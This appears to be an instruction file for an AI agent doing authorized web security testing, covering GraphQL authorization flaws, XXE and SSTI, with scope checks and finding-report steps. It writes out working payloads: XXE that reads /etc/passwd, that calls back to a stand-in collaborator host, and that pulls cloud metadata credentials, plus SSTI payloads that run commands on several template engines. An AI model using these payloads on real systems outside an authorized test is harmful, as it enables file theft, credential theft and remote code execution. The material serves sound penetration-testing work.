---
name: hunt-injection
description: GraphQL IDOR/auth-bypass, XXE file-read/SSRF (SVG/DOCX/SAML), SSTI detection and RCE. OOB-mandatory for blind XXE. Wiki-first, FIND schema output.
---

# Hunt: GraphQL / XXE / SSTI

## Pre-Attack: Wiki Query (MANDATORY)
```
qmd_query "GraphQL XXE SSTI injection" via wiki-search MCP -> read matching technique page if found.
```
Apply known introspection bypass and XXE OOB techniques already documented. Payload arsenals: `wiki/payloads/{graphql,xxe,ssti,ldap,xpath,crlf}.md`, [[xslt]] payloads.
Other XML-family surfaces: [[soap-attacks]] (SOAP/JAX-WS auth-bypass and threadlocal issues), [[xslt-injection]] (server-side XSLT transform -> SSRF/LFI/RCE via `document()`/extension functions).


**Self-heal:** If the wiki query returns nothing, create a stub `wiki/techniques/<area>/<slug>.md` (frontmatter + a `## Observed during <engagement>` section built from your findings) before proceeding, so the gap fills instead of silently recurring.

## Scope Check
- Confirm target is in scope
- Read Deadends.md - skip already-tested endpoints

---

## GRAPHQL

### Signals
```
/graphql  /api/graphql  /v1/graphql  /query  /gql
POST requests with {"query": "..."} body in Burp history
"apollo", "ApolloClient", "gql`" in JS bundles
```

### Methodology
1. Test introspection:
```bash
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name } } } }"}'
```
If blocked, try: `{"query":"{ __typename }"}`

2. Use InQL (Burp extension) or graphql-voyager to map schema
3. Find REST/GraphQL overlap - resources modifiable via BOTH APIs
4. Test IDOR: replay queries/mutations with another user's object IDs
5. Test authorization: lower-privilege user calling admin mutations
6. Test for persistent privilege after REST revokes access - GraphQL re-grants?

---

## XXE

### Attack Surface
```
/upload  /import  /parse  /convert  /saml/acs  /soap/*
Content-Type: application/xml or text/xml
SVG, DOCX, XLSX, PPTX file upload features
```

### Classic File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
```

### Blind OOB (when no reflection)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR_COLLAB/xxe?x="> %xxe;
]>
<root>test</root>
```

### SVG Upload XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

### XXE -> SSRF
```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

**OOB Gate:** blind XXE requires OOB DNS/HTTP callback confirmation. When you plant a blind/OOB XXE payload, append a row to `targets/<eng>/oob.md`: `| <token> | <sink url+param> | xxe | <date> | waiting | |` (columns: token | sink | class | planted | status | source, where token = your unique interactsh/Collaborator label). The recon-capture hook auto-correlates incoming callbacks to flip the row to HIT and SessionStart surfaces HITs; a HIT row is the confirmation gate to scaffold the FIND. Do NOT claim a blind XXE without a HIT row.

---

## SSTI

### Detection Probes (try all - different engines respond to different syntax)
```
{{7*7}}      -> 49 = Jinja2 / Twig
${7*7}       -> 49 = Freemarker / Velocity / SpEL
<%= 7*7 %>   -> 49 = ERB (Ruby)
#{7*7}       -> 49 = Mako
*{7*7}       -> 49 = Spring Thymeleaf
{{7*'7'}}    -> 7777777 = Jinja2 (not Twig)
```

### RCE Payloads (after fingerprinting engine)
```python
# Jinja2
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# ERB (Ruby)
<%= `id` %>

# Freemarker
<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}

# Spring Thymeleaf SpEL
*{T(java.lang.Runtime).getRuntime().exec('id')}
```

### Where to Test
Name/bio/description fields, email templates, invoice names, PDF generators, URL path parameters, search queries reflected in results, HTTP headers reflected in responses.

## FIND Output

If GraphQL IDOR confirmed:
```
Create Vulns/Research/FIND-XXX-HIGH-graphql-idor-<host>.md
```

If XXE file read confirmed:
```
Create Vulns/Research/FIND-XXX-HIGH-xxe-<host>.md
Severity CRITICAL if cloud metadata creds retrieved
```

If SSTI RCE confirmed:
```
Create Vulns/Research/FIND-XXX-CRITICAL-ssti-rce-<host>.md
```

If SSTI confirmed but sandboxed (no RCE):
```
Create Vulns/Research/FIND-XXX-MEDIUM-ssti-<host>.md
```

If path exhausted:
```
Append to Deadends.md: - [ ] XXE on <host> -- XML content rejected (JSON-only), SVG sanitized; SSTI -- {{7*7}} returned literally
```

**Distill to wiki (when confirmed):** if the finding is a reusable XXE bypass or SSTI chain, stage a GENERIC wiki candidate now (no client host): `python3 scripts/wiki-stage.py --kind technique --slug <slug> --target-page techniques/web/xxe.md` (SSTI findings: `--target-page techniques/web/ssti.md`). Promote later via `scripts/wiki-promote.py`.

Report: Status + files created.
